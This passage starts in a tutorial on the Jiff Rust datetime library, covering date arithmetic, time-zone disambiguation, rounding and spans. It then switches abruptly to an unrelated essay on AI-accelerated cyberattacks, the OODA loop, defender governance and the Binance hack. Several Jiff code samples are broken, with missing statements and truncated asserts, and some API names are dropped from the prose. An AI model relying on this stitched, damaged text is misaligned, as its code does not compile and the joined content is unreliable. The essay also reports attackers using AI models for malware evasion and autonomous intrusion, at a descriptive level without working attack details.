        "mar. 10 sept. 2024, 23:37:20 heure d’été de l’Est nord-américain",
    );

    Ok(())
}

The ICU4X API has a lot of options for customizing datetime formatting. Exploring it further is outside the scope of this blog.

Date Manipulation

Jiff provides many methods on its datetime types to make using them as comfortable and error-free as possible.

Date Basics

Every datetime type provides a 

new
constructor that lets callers build it from its constituent parts. In most cases, this constructor is fallible. For example:

use jiff::civil::Date;

fn main() -> anyhow::Result<()> {
    let d = Date::new(2024, 2, 29)?;
    // All datetime types have convenient
    // accessors for each of their components.
    assert_eq!(d.year(), 2024);
    assert_eq!(d.month(), 2);
    assert_eq!(d.day(), 29);

    let err = Date::new(2025, 2, 29).unwrap_err();
    assert_eq!(
        err.to_string(),
        "parameter 'day' for `2025-02` is invalid, must be in range `1..=28`",
    );

    Ok(())
}

Because creating dates is so common, there is a shorthand for doing so when you know the inputs are valid:

let d = const { civil::date(2024, 2, 29) };
assert_eq!(d.year(), 2024);
assert_eq!(d.month(), 2);
assert_eq!(d.day(), 29);

That is, 

civil::date
is a const function that will panic if its inputs are invalid. It should only be used with inputs that are known to be valid. It would, for example, be inappropriate to use this with user provided values. Because of the 
const
block above, if you try to provide invalid values, you’ll get a compiler error.

// On 2024-11-03 at 2AM in New York, time was rolled

When

(among other APIs that produce a

) would land in a gap or a fold, the “compatible” disambiguation strategy is chosen automatically:

// For a zoned datetime that lands
// in a fold, the earlier instant is
// chosen by default.
let zdt =
    civil::date(2024, 11, 2).at(1, 30, 0, 0).in_tz("America/New_York")?;

    tomorrow.to_string(),
    "2024-11-03T01:30:00-04:00[America/New_York]"
);

// And for a gap, the later instant
// is chosen by default.
let zdt =
    civil::date(2024, 3, 9).at(2, 30, 0, 0).in_tz("America/New_York")?;
let tomorrow = zdt.tomorrow()?;
assert_eq!(
    tomorrow.to_string(),
    "2024-03-10T03:30:00-04:00[America/New_York]"
);

To override this behavior, you can drop down to civil datetimes, perform the operation, and then use 

TimeZone::to_ambiguous_zoned_datetime
to control the exact disambiguation strategy:

// For a zoned datetime that lands
// in a fold, the earlier instant is
// chosen by default. But let's say
// we want the later instant.

    civil::date(2024, 11, 2).at(1, 30, 0, 0).in_tz("America/New_York")?;
let tomorrow = zdt
    .time_zone()
    .to_ambiguous_zoned_datetime(zdt.datetime().tomorrow()?)
    .later()?;
assert_eq!(
    tomorrow.to_string(),
    // Notice that the offset is now -05,
    // which corresponds to the later
    // instant.
    "2024-11-03T01:30:00-05:00[America/New_York]"
);

Date Arithmetic

All datetime types in Jiff support adding and subtracting durations, and finding the span of time between two datetime values. Let’s start with a 

civil::Date
:

use jiff::{civil, ToSpan};

fn main() -> anyhow::Result<()> {
    let d1 = civil::date(2024, 7, 30);
    let d2 = d1 + 2.days();
    assert_eq!(d2, civil::date(2024, 8, 1));

    Ok(())
}

Here we make use of the 

std::ops::Add
trait implementation for 
civil::Date
. The downside of using this, though, is that if the date value goes out of range, then it panics. That may or may not be acceptable. But if you’re dealing with user inputs, then you should use 
Date::checked_add
instead:

use jiff::{civil, ToSpan};

fn main() -> anyhow::Result<()> {
    let d1 = civil::date(2024, 7, 30);
    let d2 = d1.checked_add(2.days())?;
    assert_eq!(d2, civil::date(2024, 8, 1));

    Ok(())
}

Let’s take a look at a few other examples involving months and years:

let d = civil::date(2024, 5, 31);
assert_eq!(d.checked_add(1.month())?, civil::date(2024, 6, 30));
assert_eq!(d.checked_add(2.months())?, civil::date(2024, 7, 31));

let d = civil::date(2025, 1, 31);
assert_eq!(d.checked_add(1.month())?, civil::date(2025, 2, 28));

let d = civil::date(2024, 2, 29);
let span = 1.year().months(2).days(5);
assert_eq!(d.checked_add(span)?, civil::date(2025, 5, 4));

As with other methods on 

Date
, they are also available on 
ZonedDateTime
:

let d = civil::date(2024, 5, 31).at(13, 45, 0, 0).in_tz("America/New_York")?;
assert_eq!(
    d.checked_add(1.month())?,
    civil::date(2024, 6, 30).at(13, 45, 0, 0).in_tz("America/New_York")?
);

If we take a look at the type signature for 

ZonedDateTime::checked_add
, we can see that it’s actually polymorphic:

    &self,
    duration: A,
) -> Result<ZonedDateTime, Error>

This means that 

ZonedDateTime::checked_add
can accept any one of these duration values:

This type of polymorphism is common in Jiff. Here, it is merely used to provide a convenient way to use multiple duration types. But as we’ll see, it’s also used to provide an extension point for configuration options that control how the operation works.

In addition to adding or subtracting durations from datetime values, one can also compute the duration between two datetime values. For example, to get the number of days between two dates:

use jiff::{civil, ToSpan};

fn main() -> anyhow::Result<()> {
    let d1 = civil::date(2024, 5, 31);
    let d2 = civil::date(2024, 9, 30);
    assert_eq!(d2 - d1, 122.days().fieldwise());

    Ok(())
}

Similarly, we can use 

Date::until
to compute the span between dates:

let d1 = civil::date(2024, 5, 31);
let d2 = civil::date(2024, 9, 30);
assert_eq!(d1.until(d2)?, 122.days().fieldwise());

Like with 

Date::checked_add
, this routine is also available at 
ZonedDateTime::until
:

let zdt1 = civil::date(2024, 5, 31).in_tz("America/New_York")?;
let zdt2 = civil::date(2024, 9, 30).in_tz("America/New_York")?;
assert_eq!(zdt1.until(&zdt2)?, 2928.hours().fieldwise());

Notice though that hours, instead of days, are returned. This is because two 

ZonedDateTime
values might be in different time zones. Since a 
ZonedDateTime
is fundamentally an instant in time, and because days might be of varying length depending on the time zone, defaulting to hours as the largest possible unit means subtracting two zoned datetimes will always succeed. However, we can request larger units in the duration returned by passing additional options. Notably, 
ZonedDateTime::until
is polymorphic:

pub fn until<'a, A: Into<ZonedDateTimeDifference<'a>>>(
    &self,
    other: A,
) -> Result<Span, Error>

That is, callers aren’t just limited to passing a 

ZonedDateTime
here, but anything that can be converted to a 
ZonedDateTimeDifference
. Here is one such example, where we can override the largest units returned in the duration:

use jiff::{civil, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let zdt1 = civil::date(2024, 5, 31).in_tz("America/New_York")?;
    let zdt2 = civil::date(2024, 9, 30).in_tz("America/New_York")?;
    assert_eq!(
        zdt1.until((Unit::Month, &zdt2))?,
        3.months().days(30).fieldwise()
    );

    Ok(())
}

A 

ZonedDateTimeDifference
provides much more powerful configuration options for rounding the span returned. Take this example, which produces a span with many unit values:

use jiff::{civil::date, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let zdt1 =
        date(2024, 5, 15).at(14, 30, 54, 0).in_tz("America/New_York")?;
    let zdt2 = date(2024, 5, 31)
        .at(19, 13, 27, 123_456_789)
        .in_tz("America/New_York")?;
    assert_eq!(
        zdt1.until((Unit::Day, &zdt2))?,
        16.days()
            .hours(4)
            .minutes(42)
            .seconds(33)
            .milliseconds(123)
            .microseconds(456)
            .nanoseconds(789)
            .fieldwise(),
    );

    Ok(())
}

This might be too much precision to show to an end user. Instead, perhaps we’d like to round the span to the nearest half-hour. We can do this by building a 

ZonedDateTimeDifference
explicitly and configuring its options:

use jiff::{civil::date, RoundMode, ToSpan, Unit, ZonedDateTimeDifference};

fn main() -> anyhow::Result<()> {
    let zdt1 =
        date(2024, 5, 15).at(14, 30, 54, 0).in_tz("America/New_York")?;
    let zdt2 = date(2024, 5, 31)
        .at(19, 13, 27, 123_456_789)
        .in_tz("America/New_York")?;
    let difference = ZonedDateTimeDifference::new(&zdt2)
        .largest(Unit::Day)
        .smallest(Unit::Minute)
        .increment(30)
        .mode(RoundMode::HalfExpand);
    assert_eq!(
        zdt1.until(difference)?,
        16.days().hours(4).minutes(30).fieldwise(),
    );

    Ok(())
}

Note also that rounding a span takes time zone transitions like daylight saving time into account. For example, let’s take 

2024-11-02 17:30
and 
2024-11-03 04:45
in New York. Because New York stopped daylight saving time at 2AM on 2024-11-03, the amount of physical time between them is 12 hours and 15 minutes:

let zdt1 = date(2024, 11, 2).at(17, 30, 0, 0).in_tz("America/New_York")?;
let zdt2 = date(2024, 11, 3).at(4, 45, 0, 0).in_tz("America/New_York")?;
assert_eq!(zdt2 - zdt1, 12.hours().minutes(15).fieldwise());

Normally, if we rounded to the nearest day, this would round up to 1 day. But since the midpoint of this particular day is actually 12 hours and 30 minutes, this duration will round down to 0 days when we request it:

use jiff::{civil::date, RoundMode, ToSpan, Unit, ZonedDateTimeDifference};

fn main() -> anyhow::Result<()> {
    let zdt1 = date(2024, 11, 2).at(17, 30, 0, 0).in_tz("America/New_York")?;
    let zdt2 = date(2024, 11, 3).at(4, 45, 0, 0).in_tz("America/New_York")?;
    let difference = ZonedDateTimeDifference::new(&zdt2)
        .largest(Unit::Day)
        .smallest(Unit::Day)
        .mode(RoundMode::HalfExpand);
    assert_eq!(zdt1.until(difference)?, 0.days().fieldwise());

    Ok(())
}

Next we’ll continue our discussion of rounding, but when applied to datetimes themselves.

Date Rounding

Date rounding in Jiff is limited to units of days or lower. Therefore, it’s only available on 

ZonedDateTime
, 
Timestamp
, 
civil::DateTime
, 
civil::Time
 but not 
civil::Date
.

A common example for rounding a datetime is to reduce precision. For example, a system clock might provide nanosecond precision, but maybe we only care about the nearest half-hour:

use jiff::{civil::date, Unit};

fn main() -> anyhow::Result<()> {
    let zdt = date(2024, 11, 2)
        .at(17, 46, 20, 123_456_789)
        .in_tz("America/New_York")?;
    assert_eq!(
        zdt.to_string(),
        "2024-11-02T17:46:20.123456789-04:00[America/New_York]"
    );

    // Round to the nearest half hour.
    let rounded = zdt.round((Unit::Minute, 30))?;
    assert_eq!(
        rounded.to_string(),
        "2024-11-02T18:00:00-04:00[America/New_York]"
    );

    Ok(())
}

As with rounding spans, rounding a 

ZonedDateTime
is aware of time zone transitions:

let zdt = date(2024, 11, 3)
    .at(11, 45, 20, 123_456_789)
    .in_tz("America/New_York")?;

// Round to the nearest day.
let rounded = zdt.round(Unit::Day)?;
assert_eq!(
    rounded.to_string(),
    "2024-11-04T00:00:00-05:00[America/New_York]"
);

Notice that in the above example, our time of 11:45AM is before noon, yet the result still rounds up to the next day. This is because the midpoint for this day is 11:30AM since, by 11:30AM, 12.5 hours have already elapsed because of the repeated 1AM hour in the move away from daylight saving time in New York.

Other Calendars

Jiff itself doesn’t support any calendars other than the proleptic Gregorian calendar. One can instead use the ICU4X crate to work in non-Gregorian calendars, and convert between datetime types using the 

jiff-icu
crate: (Use 
cargo add icu jiff-icu
to make this example work.)

use icu::{
    calendar::{types::Month, Date as IcuDate},
    time::{DateTime as IcuDateTime, Time as IcuTime},
};
use jiff::civil::DateTime;
use jiff_icu::ConvertTryFrom as _;

fn main() -> anyhow::Result<()> {
    // Firstly, create an ICU datetime using the Hebrew calendar.
    let datetime = IcuDateTime {
        date: IcuDate::try_new_hebrew_v2(5785, Month::new(5), 4)?,
        time: IcuTime::try_new(17, 30, 0, 0)?,
    };

    // Secondly, convert it to a civil datetime.
    // This will automatically use ICU to convert
    // the date from the Hebrew calendar to the
    // Gregorian (or ISO) calendar.
    let zdt = DateTime::convert_try_from(datetime)?;
    assert_eq!(zdt.to_string(), "2025-02-02T17:30:00");
    Ok(())
}

When should you use each one versus the other?

To a first approximation, if you can use a 

ZonedDateTime
, then that is probably the type you want to reach for. It represents a specific instant in time in a particular geographic location. That is, it has both a 
Timestamp
and a 
TimeZone
.

If you only ever need to work in UTC or just deal with system time, then a

A

is useful in contexts where you don’t care about a specific instant in time and when calcuations should be done independent of time zone. For example, when parsing datetime information from a user interface datetime picker.

Remember that both a 

civil::DateTime
and a 
Timestamp
can be converted to a 
ZonedDateTime
by supplying a time zone.

Span Manipulation

We’ve already seen how to add spans to datetime values and how to get spans as a difference between datetime values. But we haven’t yet explored the APIs available on a 

Span
itself.

First and foremost, we can build a 

Span
through its constructor, which returns a 
Span
with all of its units set to 
0
:

use jiff::Span;

let span = Span::new();

A 

Span
is both 
Copy
and immutable. We can create new spans through method chaining:

let span = Span::new().hours(1).minutes(30);
assert_eq!(span.to_string(), "PT1H30M");

Or we can use the 

ToSpan
convenience trait, which adds methods on integer types for constructing spans:

use jiff::ToSpan;

let span = 1.hour().minutes(30);
assert_eq!(span.to_string(), "PT1H30M");

Note though that methods like 

Span::hours
and 
ToSpan::hours
will panic when the integer is outside the limits of what 
Span
supports. This is fine when your spans are literals in your program, since a panic would indicate a bug. But if your inputs come from an end user, it’s better to use fallible methods:

let span = Span::new().try_hours(1)?.try_minutes(30)?;
assert_eq!(span.to_string(), "PT1H30M");

Spans preserve each individual unit value. This means that 90 minutes and 1 hour 30 minutes, while they represent the same duration, are actually different values in memory:

let span1 = 1.hour().minutes(30);
let span2 = 90.minutes();
assert_eq!(span1.to_string(), "PT1H30M");
assert_eq!(span2.to_string(), "PT90M");

This permits callers maximum flexibility when it comes to representing durations. This makes it possible to represent durations in a specific unit even when they add up to larger units. For example, the runtime duration of films is typically conveyed in minutes, even when the runtime exceeds one hour. This can be adjusted programmatically using 

Span::round
:

use jiff::{SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span1 = 1.hour().minutes(30);
    let span2 = span1.round(SpanRound::new().largest(Unit::Minute))?;
    assert_eq!(span2.to_string(), "PT90M");

    Ok(())
}

You can go the other way as well:

use jiff::{SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span1 = 90.minutes();
    let span2 = span1.round(SpanRound::new().largest(Unit::Hour))?;
    assert_eq!(span2.to_string(), "PT1H30M");

    Ok(())
}

Neither of these examples do actual rounding, despite the name of the API. Instead, since we’re only setting the largest unit, this API is doing unit balancing. Unit balancing is when all unit values rollover into larger units up until the largest configured unit. This works even for calendar units too, but you need to provide a relative date:

use jiff::{civil, SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 2756.hours();
    let dt = civil::date(2020, 1, 1).at(0, 0, 0, 0);
    let round = SpanRound::new().largest(Unit::Year).relative(dt);
    assert_eq!(span.round(round)?.to_friendly(), "3mo 23d 20h");
    Ok(())
}

Without a relative date, it’s not possible to know how many hours are in a single month. That is, once calendar units are involved, a span cannot be interpreted as a physical duration of time until some context is applied.

The same even applies to days themselves, since days can sometimes be more or less than 24 hours. Take the above example. What happens if we use a zoned datetime as our relative date instead?

use jiff::{civil, SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 2756.hours();
    let zdt = civil::date(2020, 1, 1).at(0, 0, 0, 0).in_tz("Europe/Rome")?;
    let round = SpanRound::new().largest(Unit::Year).relative(&zdt);
    assert_eq!(span.round(round)?.to_friendly(), "3mo 23d 21h");
    Ok(())
}

Notice that the duration’s hour component changed from 

20
to 
21
. Why? Because we started with 2756 hour in both cases and because 
2020-03-29
in Rome was only 23 hours long (in a move from standard time to daylight saving time). That means that one of those days in 
3mo 23d
was only 23 hours long. So an extra hour needed to be added to make up for it.

The 

round
API can also do actual rounding:

use jiff::{SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 2.hours().minutes(30);
    let round = SpanRound::new().smallest(Unit::Hour);
    assert_eq!(span.round(round)?.to_friendly(), "3h");
    Ok(())
}

You can also change its rounding mode from the default (“half-expand”, or like you were taught rounding in school) to truncation (or one of several other modes):

use jiff::{RoundMode, SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 2.hours().minutes(30);
    let round = SpanRound::new().smallest(Unit::Hour).mode(RoundMode::Trunc);
    assert_eq!(span.round(round)?.to_friendly(), "2h");
    Ok(())
}

One can also specify a rounding increment to round to the nearest unit value. For example, to the nearest half-hour:

use jiff::{SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 2.hours().minutes(31);
    let round = SpanRound::new().smallest(Unit::Minute).increment(30);
    assert_eq!(span.round(round)?.to_friendly(), "2h 30m");
    Ok(())
}

Because a 

Span
value cannot easily be compared correctly based purely on its value in memory, a dedicated comparison 
Span::compare
 routine is provided:

let span1 = 2.hours();
let span2 = 120.minutes();
assert!(span1.compare(span2)?.is_eq());

Also, one can convert a 

Span
to a floating point value in terms of any unit. For example:

use jiff::{ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 90.minutes();
    assert_eq!(span.total(Unit::Hour)?, 1.5);
    Ok(())
}

Converting to calendar units requires a relative date for the same reasons discussed above:

use jiff::{civil, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 24.hours();
    assert_eq!(
        span.total((Unit::Month, civil::date(2026, 6, 1)))?,
        0.03333333333333333
    );
    assert_eq!(
        span.total((Unit::Month, civil::date(2026, 7, 1)))?,
        0.03225806451612903
    );
    Ok(())
}

Conclusion

So far, we’ve explored a good chunk of Jiff’s API. We didn’t talk about every nook and cranny, but I think we’ve covered the most important pieces.

We’ll wrap up by briefly discussing motivation and inspiration.

Motivation

Whenever I needed datetime handling in Rust, I always got confused. Should I use 

chrono
or 
time
? How do I get my local time from a timestamp? How do I use my system’s time zone database? How do I do calendar arithmetic?

Before I started working on Jiff, this confusion got annoying enough for me to consider writing my own crate. I felt like the APIs of both 

chrono
and 
time
could be improved upon. I personally found the domain quite interesting and so set out to build something better.

Why not improve on an existing solution, like 

chrono
or 
time
, instead of adding yet another choice into the ecosystem? I do think there are material downsides of having too many choices, but I had concluded that both 
chrono
and 
time
(in 2024) had reached a local maximum. Moreover, in 2024, I was not an expert in datetime handling. It took building a datetime library to become one. So convincing crate maintainers to go in a radically different direction would have been a tall order.

Jiff’s design and comparison documentation contain much more detail regarding the motivation and specific examples between Jiff, 

chrono
and 
time
.

Inspiration

Jiff is heavily inspired by Temporal, which is JavaScript’s standard library solution for date and time management. Jiff inherits API design, functionality and even parsing/formatting of datetime values. Note though that Jiff is not and does not aim to be a 100% compatible implementation of the Temporal specification. Jiff is meant to be a Rust ecosystem library first and foremost.

With that said, if you’re familiar with Temporal and Rust, then it’s likely you’ll find Jiff to be a relatively straightforward translation of Temporal’s API to Rust. This example shows how to use Temporal to round a calendar span to the nearest number of days relative to a date:

const duration = Temporal.Duration.from({ months: 1, days: 1, hours: 1 });
const roundedDuration = duration.round({
  largestUnit: "days",
  smallestUnit: "days",
  relativeTo: Temporal.PlainDateTime.from("2022-01-01"),
});
console.log(roundedDuration); // "P32D"

And here’s the equivalent operation in Jiff:

use jiff::{SpanRound, ToSpan, Unit};

fn main() -> anyhow::Result<()> {
    let span = 1.month().days(1).hours(1);
    let rounded_span = span.round(
        SpanRound::new()
            .largest(Unit::Day)
            .smallest(Unit::Day)
            .relative("2022-01-01".parse::<jiff::civil::Date>()?),
    )?;
    assert_eq!(rounded_span.to_string(), "P32D");
    Ok(())
}

The main difference between these examples is that Jiff’s duration type is named 

Span
instead of 
Duration
. This was done to avoid confusion with Rust’s standard library 
std::time::Duration
type.

Here are some other differences:

  • Temporal’s 
    Instant
    type in Jiff is named 
    Timestamp
    in order to avoid confusion with Rust’s standard library 
    std::time::Instant
    type.
  • Temporal’s “plain” date and time types are called “civil” in Jiff.
  • Jiff only supports the Gregorian calendar.
  • Jiff’s datetime range only extends to +/- 9999, whereas Temporal’s range is larger.

It’s easy to say that without Temporal, Jiff wouldn’t exist in its current form today.

Cybersecurity at Machine Speed (21 minute read)

tldr • 91 points • November 17, 2026

As a young West Point cadet, I studied military history and the technological innovations that have periodically transformed warfare. The introduction of firearms, the development of combined-arms maneuver warfare, and the advent of nuclear weapons all changed the underlying logic of military competition. Strategists describe such transformations as Revolutions in Military Affairs (RMAs): discontinuous changes in military capabilities that demand fundamentally new ways of fighting.

Later in life, at business school, I was taught a parallel idea in Clayton Christensen's theory of disruptive innovation. Christensen observed that established firms often fail not because they are poorly managed, but because they are optimized for the prevailing competitive environment. Disruptive technologies frequently emerge at the margins of an industry, initially serving overlooked customers or markets with products that incumbents consider inferior. As these technologies improve, they change the basis of competition, eventually undermining the advantages of established firms and reshaping entire industries.

The lesson of both is that technological change can render previously successful strategies and institutions obsolete.

I believe we are witnessing the beginning of a revolution in cybersecurity driven by artificial intelligence that will reshape not only the industry, but our understanding of what it means for a system to be secure.

Like previous technological revolutions, this transformation isn't simply about technology. It's about the collision between new capabilities and institutions designed for an earlier era. Adapting requires more than adopting new tools; it requires reorganizing how decisions are made, authority is exercised, and systems are governed.

But AI introduces an additional complication. Unlike a particular weapon or invention, AI is a general-purpose capability that continues to improve. It doesn't simply establish a new technological paradigm to which institutions can eventually adapt. It threatens to create a moving target, demanding continuous adaptation as the capabilities of intelligent systems advance.

This is especially consequential in cyberspace, which is already characterized by persistent adversarial competition. Cyber conflict is not merely a succession of isolated attacks and defensive responses, but an ongoing struggle for the initiative. [1]

AI threatens to transform the tempo of that competition by reducing the time and expertise required to discover vulnerabilities, develop exploits, and adapt to defensive measures. Attackers can increasingly operate at machine speed. Defenders, meanwhile, remain constrained by the need to safely govern complex technical systems.

The resulting asymmetry is not simply technological. It is institutional.

To understand why this transformation is so significant, it helps to revisit another concept from military strategy: the OODA loop.

1. Cybersecurity and the OODA Loop

Colonel John Boyd was a U.S. Air Force fighter pilot and military strategist whose ideas about maneuver warfare profoundly influenced modern military thinking. One of Boyd's most enduring contributions was the OODA loop: Observe, Orient, Decide, Act.

The basic idea is that adversarial competition is a continuous cycle of gathering information, interpreting the environment, making decisions, and executing them. Success depends not simply on making good decisions, but on continually adapting to changing circumstances faster and more effectively than an opponent to seize the initiative.

Intuitively, a fighter pilot who can repeatedly observe, interpret, and respond to an evolving situation faster than an adversary can gain a decisive advantage. The opponent is forced to react to circumstances that are already changing, with decisions becoming obsolete before they can be implemented.

Cybersecurity is fundamentally an OODA-loop contest.

Before AI, the attacker's loop might look something like this:

  • Observe: Scan a target's infrastructure, identify exposed services, and gather information about its software and personnel.
  • Orient: Analyze potential vulnerabilities, determine which are exploitable, and develop an attack strategy.
  • Decide: Select a target, an exploit, and an approach.
  • Act: Execute the attack, evaluate the outcome, and repeat.

Defenders operate their own loop: monitoring systems, interpreting security alerts, deciding how to respond, and implementing mitigations.

Historically, both sides faced substantial constraints imposed by human labor. Finding vulnerabilities required expertise. Developing exploits required engineering. Investigating incidents required analysts. Implementing fixes required developers and operatorsacross both engineering and product organizations.

Over time, both sides introduced increasing amounts of automation.

Attackers developed automated scanners, exploit frameworks, and malware toolkits. Defenders responded with intrusion-detection systems, endpoint protection, static code analysis, fuzzing, and automated vulnerability scanning.

These technologies have become increasingly sophisticated. But much of the progress on the defensive side has concentrated on discovering vulnerabilities and detecting attacks. They **have not** kept up the pace of safely implementing changes across complex production systems to fix those vulnerabilities as soon as they are found.

In other words, we have become much better at automating the observation of security threats than at automating the decisions and actions required to address them. The basic structure of the contest remained largely intact: software performed increasingly sophisticated tasks, while humans continued to make many of the important decisions. Organizations consequently built elaborate systems of governance around how software was developed, deployed, operated, audited, and modified.

These practices were not arbitrary bureaucratic obstacles. They were rational responses to the risks of managing complex systems.

A flawed patch can be worse than the vulnerability it is intended to fix: in July 2024, a single faulty CrowdStrike update crashed about 8.5 million Windows machines. [2] An improperly configured security tool can take down a production environment. A compromised signing system can authorize the irreversible transfer of billions of dollars.

So safeguards are necessary, in large part, to guard against unintended consequences. But these safeguards come at a cost: complexity. Every additional security control introduces dependencies, operational requirements, and potentially new failure modes. While individual controls may reduce exposure, the system as a whole becomes more complicated to understand, maintain, and modify.

And therein lies the paradox: the very processes and controls designed to make complex systems safer can also make them slower to adapt to emerging threats.

2. AI Compresses the Attacker's OODA Loop

AI changes not only the economics of attacking software, but the speed at which an attacker can cycle through the OODA loop.

Previously, the cost of discovering and exploiting a vulnerability was substantially constrained by the availability of specialized human expertise. AI increasingly makes that expertise reproducible, scalable, and available on demand.

An AI-enabled attacker can inspect code, identify potential vulnerabilities, generate exploits, test them, interpret failures, and refine its approach. Multiple agents can pursue different hypotheses simultaneously, sharing discoveries and concentrating resources on promising attack paths. These activities can increasingly be orchestrated into a continuous loop, with humans providing high-level direction rather than supervising every action.

Each stage once presented meaningful operational friction. Reconnaissance took time. Exploit development required specialized skills. Failures had to be analyzed and tactics adjusted.

AI reduces friction at nearly every stage.

Crucially, an unsuccessful exploit can immediately inform a new approach. Discovery, exploitation, and adaptation increasingly become part of the same continuous process. The attacker can repeatedly update its understanding of the target, adapting its tactics as the defender attempts to respond.

This is precisely the advantage Boyd described: an adversary operating inside the opponent's decision cycle, changing the situation faster than the opponent can orient itself and respond.

From Theory to Practice

This is no longer entirely theoretical. In September 2026, Anthropic reported observing attackers using Claude to monitor whether their malware was being detected by security software. When an implant was flagged, the attackers used AI to identify the detected components, modify them, and redeploy the malware. [3]

Consider this through Boyd's framework. The attacker observes that a defensive measure has succeeded, orients around the new information, develops a workaround, and acts to restore access. What previously required a human analyst and malware developer can increasingly be accomplished through a tightly integrated, AI-assisted workflow.

The implications are profound: the defender's successful detection is no longer necessarily the end of an engagement. It can become the starting point for the attacker's next iteration.

We are already seeing evidence of this transition. In November 2025, Anthropic reported disrupting a cyber-espionage campaign in which attackers used Claude Code to autonomously conduct much of the tactical work across reconnaissance, exploitation, lateral movement, and data collection. Anthropic estimated that AI executed 80–90% of tactical operations, with humans providing higher-level direction. [4]

The pace of these operations is already accelerating. In September 2026, Google's Threat Intelligence Group documented a campaign in which attackers used an autonomous, multi-agent framework to conduct vulnerability scanning and credential harvesting. After compromising a cloud resource, the attackers planned, built, and executed the campaign in less than six hours, compromising thousands of third-party credentials. The framework could autonomously manage scanning, troubleshoot operational problems, and rotate IP addresses without requiring human intervention for each action. [5]

Anthropic's own threat intelligence paints a similar picture: by September 2026, it was observing AI-enabled breaches completed in as little as two to three hours, with individual operators directing campaigns against dozens of victims in parallel. [3]

This is not yet evidence that every sophisticated cyberattack can be conducted autonomously. But it demonstrates that substantial parts of the attack lifecycle can be automated, and at a pace that would be impossible for a comparably sized team of human operators.

And AI doesn't merely make the attacker's OODA loop faster. For humans, the OODA loop is a mental discipline we have to remember to run. For AI agents, it's the architecture itself: read the environment, reason about it, choose an action, act, and repeat.

Humans also have to choose the level at which we run the loop: strategic, operational, or tactical. An AI-enabled attacker doesn't have to choose. It can run loops at every level at once: selecting targets across thousands of organizations, managing a campaign against one, and iterating on a single exploit, all in parallel. Attackers don't just get a faster loop. They get many loops, running simultaneously, with the cost of human expertise spread across all of them.

It Only Has to Work Somewhere

The distinction between AI-assisted and AI-directed cyberattacks is beginning to blur. And that introduces a particularly consequential asymmetry: **an attacker doesn't need an exploit that works everywhere. It needs an exploit that works somewhere.**

If an AI produces a hundred candidate exploits and ninety-nine fail, the attacker may still succeed. And each failure provides valuable feedback that can inform the next iteration, allowing the attacker to continuously refine its approach.

A security team responsible for a large software estate must account for an enormous range of vulnerabilities, configurations, dependencies, and operational conditions. It must not only discover weaknesses, but also determine whether proposed fixes are safe, compatible, and effective.

A defender cannot casually deploy a hundred experimental patches into a production banking system and treat the ninety-nine failures as useful learning experiences.

Of course, attackers are not unconstrained. Failed attempts can expose their presence. And defenders possess structural advantages of their own: they control the infrastructure, can restrict access, and can design systems that limit the consequences of compromise. AI also makes vulnerability discovery, software testing, and remediation more accessible to defenders, and will make many of these defensive capabilities substantially more powerful.

But those advantages must be engineered into systems in advance. They cannot depend entirely on human institutions identifying, authorizing, and coordinating a response after an attacker has already acted.

The central challenge is therefore not whether defensive AI can match offensive AI in raw capability. It is whether organizations can redesign their security architectures to translate that capability into effective action.

AI is rapidly reducing the human labor required for offensive adaptation. But it cannot similarly eliminate the institutional obligations that constrain defensive adaptation.**

3. The Governed Defender

Imagine an AI agent discovering a critical vulnerability in a major financial institution. The autonomous attacker may be able to develop and deploy a working exploit in minutes to hours.

Now consider the institution's response.

  • Its security team must establish whether the vulnerability affects its infrastructure.
  • Engineers must determine which services depend on the affected software.
  • A proposed fix must be evaluated for unintended consequences.
  • Changes may require testing, approvals, scheduled deployments, and coordination among internal teams and external vendors.

If the vulnerability involves a critical system, those processes become even more demanding.

And that is the normal case, not the worst one. Verizon's 2026 Data Breach Investigations Report put median full remediation at 43 days, with only 26% of known-exploited vulnerabilities fully remediated. Veracode puts average flaw-remediation time at 252 days, up from 171 five years earlier. Compare that to the mere hours or even minutes that it takes to run a successful exploit. [6]

Unlike the attacker, the defender is responsible for the continued operation of the system. An attacker generally does not care whether an exploit crashes the target, corrupts data, or causes cascading failures, provided the attack achieves its objective. The

The defender has to care about all of those outcomes, and the **unintended consequences** of applying a fix, that in some cases extend beyond the relatively narrow calculus of security.

Consider an organization that discovers a hacker may have accessed an internal system. The most surefire way to eliminate the risk would be to shut down all possibly affected infrastructure until an investigation gives a definite "all clear."

But imagine applying that principle to a financial institution responsible for billions of dollars in customer assets. Suspending critical operations whenever suspicious activity is detected could itself impose enormous costs on customers, counterparties, and the business.

The problem is that the **attacker can optimize for exploitation. The defender must balance security, availability, integrity, and continuity simultaneously.** Even if AI provides both sides with equally capable technical reasoning, the defender cannot simply abandon its obligations to move faster.

The problem only becomes more severe as systems grow more complicated. Modern software is rarely a self-contained application controlled by a single team. It depends on open-source libraries, cloud providers, operating systems, identity services, APIs, external vendors, and numerous other components.

The resulting defensive OODA loop is slower precisely because it is fragmented.

Agentic tooling can accelerate analysis and coordinate responses, but it cannot eliminate the underlying differences in authority, incentives, and accountability. Short of turning over the internet to Skynet, there is no single intelligence empowered to make security decisions on behalf of everyone.

In many cases, defenders must coordinate their actions before the complete system can adapt. Their OODA loop is distributed across institutions, each with its own governance, risk tolerances, and operational requirements.

The attacker's loop, by contrast, can operate as a unified, increasingly autonomous process.

Enter the Binance Hack

According to Binance's preliminary incident report, attackers spent months preparing a sophisticated intrusion involving social engineering, compromised developer systems, malicious software, and abuse of internal infrastructure. They ultimately gained unauthorized access to wallet-signing operations and initiated large-scale asset transfers. [7]

The attackers used Ethereum's EIP-7702 authorization mechanism to establish malicious delegation rights over a hot wallet. Once these authorizations existed on-chain, suspending normal withdrawals was insufficient to stop every unauthorized asset movement.

Binance needed to develop and execute a specialized revocation procedure. Its multiparty computation wallet architecture complicated the response, because there was no single private key that could simply be used to issue the necessary corrective transaction.

